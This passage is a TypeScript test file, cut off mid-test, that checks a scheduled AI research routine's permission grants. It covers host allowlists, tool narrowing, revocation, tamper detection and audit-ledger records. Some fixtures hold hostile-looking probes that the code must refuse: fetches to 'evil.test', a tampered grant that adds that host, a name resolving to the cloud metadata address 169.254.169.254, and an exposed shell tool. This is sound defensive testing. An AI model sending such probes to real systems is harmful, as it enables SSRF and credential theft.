import { asyncRoutineEffects } from "./async-routine-effects.js";
import { z } from "zod";
import { afterEach, expect, it } from "vitest";
import {
  ROUTINE_PRIMARY_SOURCE_POLICY,
  RoutineCreateSchema,
  evaluateGate,
  normalizeUrl,
  routineDefaults,
  unattendedDenial,
  untrustedLabel,
  type ProviderOperation,
  type RoutineFence,
  type RoutineGrantView,
} from "@tavi/contracts";
import {
  ToolRegistry,
  canonicalRoutineJson,
  registerFetchTool,
  routineHash,
  routineModelPort,
  routineResearchTools,
  type FetchTransportPort,
} from "@tavi/runtime";
import { RoutineExecutionService } from "../src/routines/runs.js";
import { RoutineNewsService } from "../src/routines/news.js";
import { RoutineService } from "../src/routines/service.js";
import { SqliteStore } from "../src/persistence/store.js";

/**
 * A scheduled child's authority is a durable property of its run, never of the
 * adapter instance that happened to build the worker: every effect resolves the
 * persisted grant, fails closed on revocation, and
 * leaves an allow/deny decision in the run ledger.
 */
const stores: SqliteStore[] = [];
afterEach(() => {
  for (const store of stores.splice(0)) store.close();
});
const scope = { workspaceId: "default", principalId: "operator" };

function newsRoutine(hosts: string[]) {
  return RoutineCreateSchema.parse({
    ...routineDefaults("Europe/Sofia"),
    operationKey: "create",
    name: "News",
    objective: "Find news",
    agent: { agentId: "news", name: "News", instructions: "Find evidence" },
    triggers: [{ id: "morning", kind: "daily", at: "09:00", timezone: "Europe/Sofia" }],
    skills: [],
    models: {
      research: { primary: { connectionId: "fixture", model: "v1" }, fallbacks: [] },
      synthesis: { primary: { connectionId: "fixture", model: "v1" }, fallbacks: [] },
    },
    permissions: {
      revision: 7,
      researchTools: ["web_search", "http.request", "messaging.send_to"],
      allowedHosts: hosts,
      networkMode: "allowlist",
    },
  });
}

function fixture(
  hosts: string[] = ["example.com"],
  modelBindings?: Readonly<Record<string, Readonly<Record<string, Readonly<Record<string, string>>>>>>,
) {
  const store = new SqliteStore({ databasePath: ":memory:", inMemory: true });
  stores.push(store);
  let now = "2026-09-20T06:00:00.000Z";
  let authorized = true;
  const routines = new RoutineService(store, {
    ...(modelBindings === undefined ? {} : { modelBindings }),
    executionAvailable: true,
    now: () => now,
    nextOccurrence: (trigger) => (trigger.kind === "once" ? null : "2026-09-21T06:00:00.000Z"),
  });
  const created = routines.create(scope, newsRoutine(hosts));
  routines.finishEvaluation(scope, created.routine.routineId, 1, true, "pass");
  // The resolver is a seam, not the system resolver: the success-path tests are
  // about the grant, and a netless sandbox must not decide whether they pass. The
  // address-guard tests override it with the answers they need.
  const runs = new RoutineExecutionService(routines, {
    ownerEpoch: "one",
    now: () => now,
    authorized: () => authorized,
    researchReady: () => ({ ready: true as const }),
    publicFetch: { resolve: async () => ["93.184.216.34"] },
  });
  const started = runs.request(scope, created.routine.routineId, "manual");
  const fence = runs.start(scope, started.runId)!;
  return {
    store,
    routines,
    runs,
    fence,
    run: runs.get(scope, started.runId),
    id: created.routine.routineId,
    setNow: (value: string) => {
      now = value;
    },
    revokeAuthority: () => {
      authorized = false;
    },
  };
}

function registry(effects: { reads: number; writes: number }) {
  const tools = new ToolRegistry();
  tools.register({
    id: "http.request",
    sink: "network",
    urlOnly: false,
    version: "1.0.0",
    description: "HTTP fixture",
    effect: "read-only",
    requiredPermissions: [],
    inputSchema: z.looseObject({ url: z.string() }),
    handler: async () => {
      effects.reads++;
      return { body: "page" };
    },
  });
  tools.register({
    id: "web_search",
    sink: "search",
    version: "1.0.0",
    description: "Search fixture",
    effect: "read-only",
    requiredPermissions: [],
    inputSchema: z.looseObject({ query: z.string() }),
    handler: async () => {
      effects.reads++;
      return { sources: [] };
    },
  });
  tools.register({
    id: "messaging.send_to",
    sink: "message",
    version: "1.0.0",
    description: "Message fixture",
    effect: "external",
    requiredPermissions: [],
    inputSchema: z.looseObject({ to: z.string() }),
    handler: async () => {
      effects.writes++;
      return {};
    },
  });
  tools.register({
    id: "shell.exec",
    sink: "none",
    version: "1.0.0",
    description: "Shell fixture",
    effect: "mutating",
    requiredPermissions: [],
    inputSchema: z.looseObject({ command: z.string() }),
    handler: async () => {
      effects.writes++;
      return {};
    },
  });
  return tools;
}

const call = (tools: ReturnType<typeof routineResearchTools>, id: string, input: unknown) =>
  tools.get(id)!.handler({ input, context: { ...scope, runId: "worker-task", caller: "routine" }, signal: new AbortController().signal });

it("admits an allowlisted fetch for a scheduled child with no interactive approval", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  await expect(call(tools, "http.request", { url: "https://example.com/news" })).resolves.toMatchObject({ body: "page" });
  expect(effects).toMatchObject({ reads: 1, writes: 0 });
  const decisions = f.runs.ledger(scope, f.id).filter((event) => event.envelope.decision !== undefined);
  expect(decisions.every((event) => event.envelope.decision === "allow")).toBe(true);
  expect(
    decisions.some(
      (event) => event.envelope.code === "tool" && event.envelope.tool === "http.request" && event.envelope.grantId === f.run.grantId,
    ),
  ).toBe(true);
  expect(f.runs.ledger(scope, f.id).find((event) => event.envelope.code === "grant")?.envelope).toMatchObject({
    decision: "allow",
    policyRevision: 7,
  });
});

it("denies a host outside the run's grant before any request is made", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  await expect(call(tools, "http.request", { url: "https://evil.test/page" })).rejects.toThrow(/outside the research grant/);
  expect(effects.reads).toBe(0);
  const deny = f.runs.ledger(scope, f.id).find((event) => event.envelope.decision === "deny");
  expect(deny?.envelope).toMatchObject({ code: "grant", denial: "host-outside-grant", tool: "http.request" });
});

it("denies a tool this module never exposes, and a tool outside the granted snapshot", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  // Messaging and shell are not in `routineResearchTools`'s own upper bound: `get` refuses them outright.
  expect(tools.get("messaging.send_to")).toBeUndefined();
  expect(tools.get("shell.exec")).toBeUndefined();
  expect(tools.resolveModelName("messaging_send_to")).toBeUndefined();
  expect(() => f.runs.reserveTool(f.fence, "shell.exec")).toThrow();
  // A granted-but-ungrantable tool stays refused even though the snapshot lists it.
  expect(() => f.runs.assertGrant(f.fence, "research", { tool: "messaging.send_to" })).toThrow(/outside the research grant/);
  expect(effects.writes).toBe(0);
});

it("refuses the next effect after revocation while leaving fetched evidence intact", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  await call(tools, "http.request", { url: "https://example.com/first" });
  const before = f.runs.ledger(scope, f.id).filter((event) => event.envelope.code === "tool");
  f.runs.revokeGrant(scope, f.run.runId, "Operator revoked the research grant");
  await expect(call(tools, "http.request", { url: "https://example.com/second" })).rejects.toThrow(/revoked/);
  expect(effects.reads).toBe(1);
  // Already-fetched evidence stays: a revocation bounds the future, it does not rewrite the past.
  expect(f.runs.ledger(scope, f.id).filter((event) => event.envelope.code === "tool")).toEqual(before);
  expect(f.runs.grantFor(scope, f.run.runId)).toMatchObject({
    revokedAt: "2026-09-20T06:00:00.000Z",
    revokedReason: "Operator revoked the research grant",
  });
});

it("refuses an effect that carries a stale grant identity", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const stale = { ...f.run, grantId: "routine-grant-from-a-previous-run" };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), stale, f.fence);
  await expect(call(tools, "http.request", { url: "https://example.com/page" })).rejects.toThrow(/does not match this run/);
  expect(effects.reads).toBe(0);
  expect(f.runs.ledger(scope, f.id).find((event) => event.envelope.denial === "grant-mismatch")).toBeDefined();
});

it("refuses a worker whose run has no durable grant at all", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  // A run with no grant: the *column* is NULL and no grant
  // row exists. The
  // identity claim alone cannot reach this: `assertFence` re-reads the run from
  // storage, so the absence has to be durable for the assertion to mean anything.
  f.store.handle.prepare("UPDATE tavi_routine_runs SET grant_id=NULL WHERE run_id=?").run(f.run.runId);
  f.store.handle.prepare("DELETE FROM tavi_routine_grants WHERE run_id=?").run(f.run.runId);
  const ungranted = f.runs.get(scope, f.run.runId);
  expect(ungranted.grantId).toBeNull();
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), ungranted, f.fence);
  await expect(call(tools, "http.request", { url: "https://example.com/page" })).rejects.toThrow(/no durable grant/);
  expect(effects.reads).toBe(0);
  // The refusal is a grant decision, so it lands in the durable ledger as one.
  expect(f.runs.ledger(scope, f.id).some((event) => event.envelope.denial === "grant-absent")).toBe(true);
});

it("pins one grant per run and exposes the intersected policy to the inspector", async () => {
  const f = fixture(["example.com", "news.example.org"]);
  const pinned = f.runs.grantFor(scope, f.run.runId)!;
  expect(pinned).toMatchObject({ runId: f.run.runId, revision: 1, policyRevision: 7, mode: "production" });
  expect(pinned.allowedHosts).toEqual(["example.com", "news.example.org"]);
  expect(pinned.researchTools).toEqual(["http.request", "messaging.send_to", "web_search"]);
  const view: RoutineGrantView = f.runs.effectiveGrantPolicy(scope, f.run.runId)!;
  // The effective tool set is the grant ∩ the adapter's own grantable tools, so
  // `messaging.send_to` — which the snapshot lists but no research path exposes —
  // is reported as narrowed rather than as usable.
  expect(view).toMatchObject({
    researchTools: ["web_search", "http.request"],
    narrowedTools: ["messaging.send_to"],
    revokedAt: null,
    revokedReason: null,
  });
  // `routineResearchTools` remains a second, independent upper bound over the grant.
  const effects = { reads: 0, writes: 0 };
  expect(
    routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence)
      .list()
      .map((tool) => tool.id),
  ).toEqual(["http.request", "web_search"]);
  // A second run gets its own grant identity; the first is untouched.
  const second = f.runs.request(scope, f.id, "another");
  f.runs.start(scope, second.runId);
  expect(f.runs.get(scope, second.runId).grantId).not.toBe(f.run.grantId);
  expect(f.runs.grantFor(scope, f.run.runId)!.grantId).toBe(pinned.grantId);
});

it("derives the adapter's offered tools and the grant's tools from one allowlist", () => {
  const f = fixture();
  // `routineResearchTools` decides what the model may see and `routineGrantableTools`
  // decides what an effect may run; both read `routineGrantableToolIds`, so the two
  // consumers must agree on every candidate. A tool added to one copy of the list
  // and not the other would make `offered` and `granted` differ here.
  const offered = routineResearchTools(registry({ reads: 0, writes: 0 }), asyncRoutineEffects(f.runs), f.run, f.fence)
    .list()
    .map((tool) => tool.id);
  const candidates = ["web_search", "http.request", "web_fetch"];
  const granted = candidates.filter((tool) => f.runs.resolveGrant(f.fence, "research", { tool, url: "https://example.com/" }).allowed);
  expect(offered).toEqual(["http.request", "web_search"]);
  expect([...granted].sort()).toEqual([...offered].sort());
  // The shared list is what refuses `web_fetch` in `allowlist` mode, for the same
  // reason the adapter never offers it.
  expect(f.runs.resolveGrant(f.fence, "research", { tool: "web_fetch", url: "https://example.com/" })).toMatchObject({
    allowed: false,
    code: "tool-outside-grant",
  });
});

it("revokes the grant when the run is cancelled, and denies a provider call without one", async () => {
  const f = fixture();
  const port = routineModelPort(
    { stream: async () => ({ attemptId: "a", status: "completed", text: "", toolCalls: [], usage: { totalTokens: 1 } }) },
    asyncRoutineEffects(f.runs),
    f.run,
    f.fence,
    "research",
  );
  f.runs.cancel(scope, f.run.runId);
  await expect(
    port.stream(
      { connectionId: "fixture", model: "v1", runId: "task", attemptId: "a", attemptNumber: 1, messages: [], tools: [] },
      { signal: AbortSignal.timeout(50), onEvent: () => {} },
    ),
  ).rejects.toThrow(/fenced/);
  expect(f.runs.grantFor(scope, f.run.runId)!.revokedAt).not.toBeNull();
});

it("scopes a grant to its own workspace and refuses to read it from another", () => {
  const f = fixture();
  for (const other of [
    { ...scope, workspaceId: "other" },
    { ...scope, principalId: "other" },
  ]) {
    expect(() => f.runs.grantFor(other, f.run.runId)).toThrow(/scope/);
    expect(() => f.runs.effectiveGrantPolicy(other, f.run.runId)).toThrow(/scope/);
    expect(() => f.runs.revokeGrant(other, f.run.runId)).toThrow(/scope/);
  }
});

it("keeps a tampered grant record from resolving, and from being rendered at all", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  f.store.handle
    .prepare("UPDATE tavi_routine_grants SET grant_json=? WHERE run_id=?")
    .run(JSON.stringify({ ...f.runs.grantFor(scope, f.run.runId), allowedHosts: ["evil.test"] }), f.run.runId);
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  await expect(call(tools, "http.request", { url: "https://evil.test/page" })).rejects.toThrow(/does not match this run/);
  expect(effects.reads).toBe(0);
  // The inspector loads through the same hardened `loadGrant`, so it reports the
  // refusal as a typed error instead of rendering the tampered revision as the
  // run's authority (or throwing a raw parse error out of `inspect`).
  expect(() => f.runs.grantFor(scope, f.run.runId)).toThrow(/grant is not readable/);
  expect(() => f.runs.effectiveGrantPolicy(scope, f.run.runId)).toThrow(/grant is not readable/);
});

it("keeps a resumed run's grant when a previous owner is recovered", () => {
  const f = fixture();
  const restarted = new RoutineExecutionService(f.routines, {
    ownerEpoch: "two",
    now: () => "2026-09-20T06:05:00.000Z",
    authorized: () => true,
    researchReady: () => ({ ready: true }),
  });
  expect(restarted.recoverPreviousOwner()).toBe(1);
  const fence = restarted.start(scope, f.run.runId)!;
  expect(fence.generation).toBeGreaterThan(f.fence.generation);
  expect(restarted.get(scope, f.run.runId).grantId).toBe(f.run.grantId);
  expect(restarted.effectiveGrantPolicy(scope, f.run.runId)).toMatchObject({ grantId: f.run.grantId as string, revokedAt: null });
});

it("still refuses a research effect when the owner's live authority is withdrawn", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  f.revokeAuthority();
  // The refusal names the withdrawn authority, not a revocation: nothing revoked
  // this grant, the workspace's own authority moved.
  await expect(call(tools, "http.request", { url: "https://example.com/page" })).rejects.toThrow(/authority no longer covers/);
  expect(effects.reads).toBe(0);
});

it("records a fence for the grant of a preview run without touching production policy", () => {
  const f = fixture();
  const preview = f.runs.request(scope, f.id, "preview", "preview");
  expect(f.runs.get(scope, preview.runId)).toMatchObject({ mode: "preview" });
  expect(f.runs.grantFor(scope, preview.runId)!.mode).toBe("preview");
});

it("keeps the grant fence-compatible across a re-start of the same generation", () => {
  const f = fixture();
  const fence: RoutineFence = f.runs.start(scope, f.run.runId) ?? f.fence;
  expect(f.runs.resolveGrant(fence, "research")).toMatchObject({ allowed: true });
  expect(f.runs.resolveGrant(fence, "research", { tool: "http.request", url: "https://example.com" })).toMatchObject({ allowed: true });
  expect(f.runs.resolveGrant(fence, "research", { tool: "http.request", url: "http://example.com" })).toMatchObject({
    allowed: false,
    code: "host-outside-grant",
  });
  expect(f.runs.resolveGrant(fence, "research", { tool: "http.request", url: "https://example.com:8443" })).toMatchObject({
    allowed: false,
    code: "host-outside-grant",
  });
  expect(f.runs.resolveGrant(fence, "research", { tool: "http.request", url: "https://user:pw@example.com" })).toMatchObject({
    allowed: false,
    code: "host-outside-grant",
  });
  expect(f.runs.resolveGrant(fence, "research", { destinationId: "unknown-target" })).toMatchObject({
    allowed: false,
    code: "destination-outside-grant",
  });
});

it("lets an in-flight fetch finish but refuses to capture evidence after revocation", async () => {
  const f = fixture();
  let release!: () => void;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  const entered = Promise.withResolvers<void>();
  let reads = 0;
  const tools = new ToolRegistry();
  tools.register({
    id: "http.request",
    sink: "network",
    urlOnly: false,
    version: "1.0.0",
    description: "Slow",
    effect: "read-only",
    requiredPermissions: [],
    inputSchema: z.looseObject({ url: z.string() }),
    handler: async () => {
      entered.resolve();
      await gate;
      reads++;
      return { body: "page" };
    },
  });
  const captured: string[] = [];
  const wrapped = routineResearchTools(tools, asyncRoutineEffects(f.runs), f.run, f.fence, (tool) => {
    captured.push(tool);
    return {};
  });
  const pending = wrapped.get("http.request")!.handler({
    input: { url: "https://example.com/a" },
    context: { ...scope, runId: "worker", caller: "routine" },
    signal: new AbortController().signal,
  });
  // Revocation bounds the *next* effect; an effect already in flight is not
  // aborted, but its result must not become evidence.
  await entered.promise;
  f.runs.revokeGrant(scope, f.run.runId, "mid-flight");
  release();
  await expect(pending).rejects.toThrow(/revoked/);
  expect(reads).toBe(1);
  expect(captured).toEqual([]);
  expect(f.runs.ledger(scope, f.id).some((event) => event.envelope.denial === "grant-revoked")).toBe(true);
});

it.each([
  ["example.com:8443", "https://example.com:8443/a"],
  ["*.example.com", "https://news.example.com/a"],
])("resolves the allowlist entry %s the way the http tool does", (host, url) => {
  const f = fixture([host]);
  expect(f.runs.resolveGrant(f.fence, "research", { tool: "http.request", url })).toMatchObject({ allowed: true });
  // The grant is an intersection, not a second policy: an entry the tool would
  // refuse is refused here too.
  expect(f.runs.resolveGrant(f.fence, "research", { tool: "http.request", url: "http://news.example.com/a" })).toMatchObject({
    allowed: false,
    code: "host-outside-grant",
  });
});

it("revokes only the named run's grant, and reports the reason on the view", () => {
  const f = fixture();
  const second = f.runs.request(scope, f.id, "second");
  f.runs.start(scope, second.runId);
  const view = f.runs.revokeGrant(scope, f.run.runId, "first only")!;
  expect(view.revokedReason).toBe("first only");
  expect(f.runs.grantFor(scope, second.runId)!.revokedAt).toBeNull();
  expect(f.runs.grantFor(scope, f.run.runId)!.revokedAt).not.toBeNull();
  expect(f.runs.ledger(scope, f.id).filter((event) => event.envelope.denial === "grant-revoked")).toHaveLength(1);
});

it("refuses the effect and reports the gap when a denial cannot be recorded", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const gaps: string[] = [];
  f.runs.cancel(scope, f.run.runId);
  const runs = new RoutineExecutionService(f.routines, {
    ownerEpoch: "one",
    now: () => "2026-09-20T06:00:00.000Z",
    authorized: () => true,
    researchReady: () => ({ ready: true as const }),
    onLedgerGap: (input) => {
      gaps.push(input.code);
    },
  });
  const run = runs.request(scope, f.id, "gap");
  const fence = runs.start(scope, run.runId)!;
  f.store.handle.exec("CREATE TRIGGER fail_event BEFORE INSERT ON tavi_routine_events BEGIN SELECT RAISE(ABORT, 'ledger full'); END");
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(runs), runs.get(scope, run.runId), fence);
  await expect(call(tools, "http.request", { url: "https://evil.test/x" })).rejects.toThrow(/outside the research grant/);
  expect(effects.reads).toBe(0);
  // The refusal stands even when the record cannot be written, and the loss is loud.
  expect(gaps).toEqual(["host-outside-grant"]);
});

it("reports a withdrawn live authority distinctly from an explicit revocation", async () => {
  const f = fixture();
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(f.runs), f.run, f.fence);
  f.revokeAuthority();
  // The operator reads the reason the effect was refused, not a generic one: the
  // ledger code and the thrown message both distinguish the two cases.
  await expect(call(tools, "http.request", { url: "https://example.com/page" })).rejects.toThrow(/authority no longer covers/);
  expect(f.runs.ledger(scope, f.id).some((event) => event.envelope.denial === "authority-withdrawn")).toBe(true);
  expect(f.runs.ledger(scope, f.id).some((event) => event.envelope.denial === "grant-revoked")).toBe(false);
});

it("ingests one public page under open_web and records the chain, the address class and the hash", async () => {
  const f = fixture();
  // The revision widens to open_web and declares the guarded tool, so a run
  // admitted from it pins that mode in its grant and offers `web_fetch`.
  const revision = f.routines.get(scope, f.id, 1).revision.snapshot;
  f.store.handle.prepare("UPDATE tavi_routine_revisions SET snapshot_json=? WHERE routine_id=? AND revision=?").run(
    canonicalRoutineJson({
      ...revision,
      permissions: {
        ...revision.permissions,
        researchTools: [...revision.permissions.researchTools, "web_fetch"],
        networkMode: "open_web",
      },
    }),
    f.id,
    1,
  );
  const exchanges: { url: string; address: string }[] = [];
  const transport: FetchTransportPort = {
    exchange: async ({ url, address }) => {
      exchanges.push({ url: url.toString(), address });
      const redirect = url.pathname === "/start";
      const body = new TextEncoder().encode(
        '<html><title>Model One</title><meta property="article:published_time" content="2026-09-20T05:00:00Z"><p>Model One version 2 is now available.</p></html>',
      );
      return {
        status: redirect ? 302 : 200,
        headers: redirect ? { location: "https://news.example.org/release", "content-type": "text/html" } : { "content-type": "text/html" },
        chunks: {
          async *[Symbol.asyncIterator]() {
            yield body;
          },
        },
      };
    },
  };
  const operations: ProviderOperation[] = [];
  const finished: string[] = [];
  const execution = {
    ownerSession: "owner",
    implementationHash: "b".repeat(64),
    signal: new AbortController().signal,
    actsIn: (_workspaceId: string, principalId: string) => principalId === scope.principalId,
    ledger: {
      reserveOperation: async (operation: ProviderOperation) => {
        operations.push(operation);
      },
      finishOperation: async (_run: string, _attempt: string, state: string) => {
        finished.push(state);
      },
      operations: async () => [],
    },
  };
  const runs = new RoutineExecutionService(f.routines, {
    ownerEpoch: "one",
    now: () => "2026-09-20T06:00:00.000Z",
    authorized: () => true,
    researchReady: () => ({ ready: true as const }),
    publicFetch: { resolve: async () => ["93.184.216.34"], transport, execution },
  });
  // One running run per owner: retire the fixture's own run before admitting this one.
  f.runs.cancel(scope, f.run.runId);
  const run = runs.request(scope, f.id, "open-web");
  const fence = runs.start(scope, run.runId)!;
  const news = new RoutineNewsService(runs);
  const registry = new ToolRegistry();
  // Registered as production does, with no `--http-allow-host`: the operator's
  // list neither hides the routine's fetch nor refuses its hosts.
  registerFetchTool(registry, { enabled: true, networkMode: "custom_hosts", allowedHosts: [], execution });
  registry.register({
    id: "web_search",
    sink: "search",
    version: "1.0.0",
    description: "Search fixture",
    effect: "read-only",
    requiredPermissions: [],
    inputSchema: z.looseObject({ query: z.string() }),
    handler: async () => ({ sources: [{ url: "https://news.example.com/start", snippet: "Model One version 2" }] }),
  });
  const tools = routineResearchTools(registry, asyncRoutineEffects(runs), runs.get(scope, run.runId), fence, (tool, input, output) =>
    news.capture(fence, tool, input, output),
  );
  expect((await tools.listOffered({ workspaceId: scope.workspaceId })).map((tool) => tool.id)).toContain("web_fetch");
  const fetchTool = tools.get("web_fetch")!;
  // The served assessor's host-list refusal is the operator's chat policy, not the routine's: only the URL reaches the gate.
  expect(fetchTool.assess?.({ url: "https://news.example.com/start" }, { ...scope, runId: "worker", caller: "routine" })).toEqual({
    display: { title: "Fetch https://news.example.com/start" },
    subjects: [],
    risk: "low",
    reasons: [],
    urls: ["https://news.example.com/start"],
  });
  const input = { url: "https://news.example.com/start" };
  const context = { ...scope, runId: "worker", caller: "routine" };
  // Open-web fetches reach only what this run's search returned: search first.
  await tools.get("web_search")!.handler({ input: { query: "Model One" }, context, signal: new AbortController().signal });
  const binding = await fetchTool.resolveBinding!(input, context);
  const page = (await fetchTool.handler({
    input,
    context,
    signal: new AbortController().signal,
    expectedBindingHash: binding.bindingHash,
  })) as { sourceId: string; redirects: string[]; addressClass: string; contentHash: string | null; state: string; publisher: string };
  expect(page).toMatchObject({
    redirects: ["https://news.example.org/release"],
    addressClass: "public",
    state: "fetched",
    publisher: "news.example.org",
  });
  expect(page.contentHash).toMatch(/^[a-f0-9]{64}$/);
  // Every hop was dialed on the address the guard validated, and the second hop
  // was re-validated rather than reused.
  expect(exchanges).toEqual([
    { url: "https://news.example.com/start", address: "93.184.216.34" },
    { url: "https://news.example.org/release", address: "93.184.216.34" },
  ]);
  const fetches = runs.ledger(scope, f.id).filter((event) => event.envelope.tool === "web_fetch");
  expect(fetches).toHaveLength(1);
  // The dispatcher reserved the attempt in both the provider and the routine ledger.
  expect(operations).toHaveLength(1);
  expect(operations[0]).toMatchObject({
    binding: { kind: "fetch", instanceId: "builtin:public-fetch", endpoint: "https://news.example.com" },
    runId: "worker",
  });
  expect(fetches[0]?.envelope.operation).toEqual(operations[0]);
  expect(finished).toEqual(["completed"]);
});

it("keeps web_fetch off the research surface until the revision widens its mode", () => {
  const f = fixture();
  const tools = routineResearchTools(registry({ reads: 0, writes: 0 }), asyncRoutineEffects(f.runs), f.run, f.fence);
  expect(tools.get("web_fetch")).toBeUndefined();
  expect(f.runs.resolveGrant(f.fence, "research", { tool: "web_fetch", url: "https://news.example.com/" })).toMatchObject({
    allowed: false,
    code: "tool-outside-grant",
  });
});

it("records the curated policy version on a primary_sources grant, so a moved list is visible", () => {
  const f = fixture();
  // Widen the pinned revision to `primary_sources` and admit a run from it.
  const revision = f.routines.get(scope, f.id, 1).revision.snapshot;
  f.store.handle
    .prepare("UPDATE tavi_routine_revisions SET snapshot_json=? WHERE routine_id=? AND revision=?")
    .run(canonicalRoutineJson({ ...revision, permissions: { ...revision.permissions, networkMode: "primary_sources" } }), f.id, 1);
  f.runs.cancel(scope, f.run.runId);
  const run = f.runs.request(scope, f.id, "primary-sources");
  const pinned = f.runs.grantFor(scope, run.runId)!;
  expect(pinned.networkMode).toBe("primary_sources");
  // The version travels with the grant and is visible in the view, so a reader can
  // tell which list produced this run's authority.
  expect(pinned.primarySourcePolicyVersion).toBe(ROUTINE_PRIMARY_SOURCE_POLICY.version);
  expect(f.runs.effectiveGrantPolicy(scope, run.runId)).toMatchObject({
    primarySourcePolicyVersion: ROUTINE_PRIMARY_SOURCE_POLICY.version,
  });
  // And it is *inside* the hash: recording a different version without rewriting
  // the hash makes the grant unreadable rather than silently authoritative.
  const { revokedAt: _revokedAt, revokedReason: _revokedReason, ...stored } = pinned;
  const drifted = { ...stored, primarySourcePolicyVersion: ROUTINE_PRIMARY_SOURCE_POLICY.version + 1 };
  f.store.handle.prepare("UPDATE tavi_routine_grants SET grant_json=? WHERE run_id=?").run(canonicalRoutineJson(drifted), run.runId);
  expect(() => f.runs.grantFor(scope, run.runId)).toThrow(/grant is not readable/);
  // Rewriting the hash too leaves the grant readable, and the recorded version is
  // then a visible difference from the live constant rather than an indistinguishable one.
  f.store.handle
    .prepare("UPDATE tavi_routine_grants SET grant_json=?,grant_hash=? WHERE run_id=?")
    .run(canonicalRoutineJson(drifted), routineHash(drifted), run.runId);
  const recorded = f.runs.grantFor(scope, run.runId)!;
  expect(recorded.primarySourcePolicyVersion).toBe(ROUTINE_PRIMARY_SOURCE_POLICY.version + 1);
  expect(recorded.primarySourcePolicyVersion).not.toBe(ROUTINE_PRIMARY_SOURCE_POLICY.version);
});

it("does not record a resolver failure as a grant denial", async () => {
  const f = fixture();
  const runs = new RoutineExecutionService(f.routines, {
    ownerEpoch: "one",
    now: () => "2026-09-20T06:00:00.000Z",
    authorized: () => true,
    researchReady: () => ({ ready: true as const }),
    publicFetch: {
      resolve: async () => {
        throw new Error("resolver unavailable");
      },
    },
  });
  f.runs.cancel(scope, f.run.runId);
  const run = runs.request(scope, f.id, "resolver-failure");
  const fence = runs.start(scope, run.runId)!;
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(runs), runs.get(scope, run.runId), fence);
  // A resolver failure is an availability problem, so it keeps its own typed
  // classification instead of borrowing the authority one.
  const thrown = await call(tools, "http.request", { url: "https://example.com/page" }).catch((error: unknown) => error);
  expect(thrown).toMatchObject({ code: "UNAVAILABLE" });
  expect(effects.reads).toBe(0);
  // The name is inside the grant and no address was ever classified, so the
  // durable ledger must not claim the destination was outside what the grant can
  // reach. Only a typed authority refusal is a grant decision.
  expect(runs.ledger(scope, f.id).some((event) => event.envelope.denial === "host-outside-grant")).toBe(false);
});

it("refuses a routine http.request whose allowlisted name resolves to a private address", async () => {
  const f = fixture();
  const runs = new RoutineExecutionService(f.routines, {
    ownerEpoch: "one",
    now: () => "2026-09-20T06:00:00.000Z",
    authorized: () => true,
    researchReady: () => ({ ready: true as const }),
    publicFetch: { resolve: async () => ["169.254.169.254"] },
  });
  f.runs.cancel(scope, f.run.runId);
  const run = runs.request(scope, f.id, "guarded-legacy");
  const fence = runs.start(scope, run.runId)!;
  const effects = { reads: 0, writes: 0 };
  const tools = routineResearchTools(registry(effects), asyncRoutineEffects(runs), runs.get(scope, run.runId), fence);
  // The allowlist would have permitted the name; the address classification is
  // what refuses it, so the allowlist is never the only check.
  await expect(call(tools, "http.request", { url: "https://example.com/metadata" })).rejects.toThrow(/link-local/);
  expect(effects.reads).toBe(0);
  expect(runs.ledger(scope, f.id).some((event) => event.envelope.denial === "host-outside-grant")).toBe(true);
});

it("pins provider identity in a revision and refuses a changed model before spending budget", async () => {
  const { providerRevision } = await import("../src/plugin-host/provider-bindings.js");
  const binding = {
    kind: "model" as const,
    instanceId: "fixture",
    ...scope,
    accountId: "a",
    endpoint: "https://provider.example",
    implementationHash: "a".repeat(64),
    configRevision: "b".repeat(64),
  };
  const original = providerRevision(binding);
  const f = fixture(["example.com"], { default: { operator: { fixture: original } } });
  expect(f.run.snapshot.models.research.primary.bindingHash).toBe(original);
  let current = original;
  let dispatched = 0;
  const models: import("@tavi/contracts").ModelPort = {
    resolveBinding: async () => ({ binding, bindingHash: current }),
    stream: async (request) => {
      dispatched++;
      return { attemptId: request.attemptId, status: "completed", text: "ok", toolCalls: [], usage: { totalTokens: 1 } };
    },
  };
  const port = routineModelPort(models, asyncRoutineEffects(f.runs), f.run, f.fence, "research");
  const request = { runId: "worker", attemptId: "first", attemptNumber: 1, connectionId: "fixture", model: "v1", messages: [], tools: [] };
  await port.stream(request, { signal: new AbortController().signal, onEvent() {} });
  const before = f.runs.get(scope, f.run.runId).data.modelCalls;
  current = "c".repeat(64);
  await expect(port.stream({ ...request, attemptId: "second" }, { signal: new AbortController().signal, onEvent() {} })).rejects.toThrow(
    /binding changed/,
  );
  expect(dispatched).toBe(1);
  expect(f.runs.get(scope, f.run.runId).data.modelCalls).toBe(before);
  expect(f.runs.ledger(scope, f.id).some((row) => row.envelope.operation?.bindingHash === original)).toBe(true);
});

it("reports unavailable routine bindings as fallback candidates without reserving a call", async () => {
  const { TaviError } = await import("@tavi/contracts");
  const f = fixture();
  let dispatched = 0;
  const model: import("@tavi/contracts").ModelPort = {
